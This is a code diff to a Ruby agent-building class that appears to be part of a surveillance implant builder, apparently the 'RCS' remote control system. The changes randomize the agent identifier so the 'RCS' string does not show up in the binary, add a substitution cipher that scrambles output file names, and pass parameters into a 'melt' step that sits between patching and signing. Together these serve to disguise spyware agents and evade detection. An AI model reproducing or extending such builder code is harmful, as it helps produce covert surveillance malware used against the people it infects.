@@ -2,6 +2,8 @@
 #  Agent creation superclass
 #
 
+require_relative 'exec'
+
 # from RCS::Common
 require 'rcs-common/trace'
 
@@ -112,7 +114,7 @@ class Build
 
     # Agent ID
     begin
-      id = @factory.ident
+      id = @factory.ident.dup
       # first three bytes are random to avoid the RCS string in the binary file
       id['RCS_'] = SecureRandom.hex(2)
       content['av3pVck1gb4eR2'] = id
@@ -145,11 +147,36 @@ class Build
     end
   end
 
-  def scramble
-    trace :debug, "super #{__method__}"
+  def scramble_name(name, offset)
+   alphabet = '_BqwHaF8TkKDMfOzQASx4VuXdZibUIeylJWhj0m5o2ErLt6vGRN9sY1n3Ppc7g-C'
+
+   offset %= alphabet.size
+   offset = offset != 0 ? offset : 1
+
+   ret = ''
+
+   name.each_char do |c|
+     index = alphabet.index c
+     ret += index.nil? ? c : alphabet[(index + offset) % alphabet.size]
+   end
+
+   return ret
   end
 
-  def melt
+  def scramble
+    # rename the outputs with the scrambled names
+    @outputs.each do |file|
+      if @scrambled[file.to_sym]
+        old_name = File.join @tmpdir, file
+        new_name = File.join @tmpdir, @scrambled[file.to_sym]
+        File.rename(old_name, new_name)
+        @outputs[@outputs.index(file)] = @scrambled[file.to_sym]
+      end
+    end
+    trace :debug, "Build: scrambled: #{@outputs.inspect}"
+  end
+
+  def melt(params)
     trace :debug, "super #{__method__}"
   end
 
@@ -176,7 +203,7 @@ class Build
       unpack
       patch params['binary']
       scramble
-      melt
+      melt params['melt']
       sign
       pack
     rescue Exception => e
